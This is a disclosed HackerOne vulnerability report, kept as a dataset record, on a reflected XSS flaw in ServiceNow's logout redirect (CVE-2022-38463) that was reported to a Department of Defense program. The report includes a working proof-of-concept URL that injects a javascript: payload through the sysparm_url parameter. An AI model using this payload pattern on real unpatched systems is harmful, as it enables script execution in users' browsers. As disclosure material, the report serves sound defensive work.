---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1699855'
original_report_id: '1699855'
title: XSS in ServiceNow logout https://████:443
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: deptofdefense
created_at: '2022-09-14T10:48:09.077Z'
disclosed_at: '2023-05-15T15:14:43.122Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# XSS in ServiceNow logout https://████:443

## Metadata

- HackerOne Report ID: 1699855
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: deptofdefense
- Disclosed At: 2023-05-15T15:14:43.122Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Description:**
XSS in ServiceNow logout 
https://██████:443/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain)
## References
https://nvd.nist.gov/vuln/detail/CVE-2022-38463

## Impact

Unauthenticated remote attacker can execute code in user's browser context.  User must click on malicious link

## System Host(s)
███████

## Affected Product(s) and Version(s)
Servicenow prior to SanDiego SP6

## CVE Numbers
CVE-2022-38463

## Steps to Reproduce
Click on https://█████:443/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain)

## Suggested Mitigation/Remediation Actions
Upgrade to patched version of ServiceNow

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
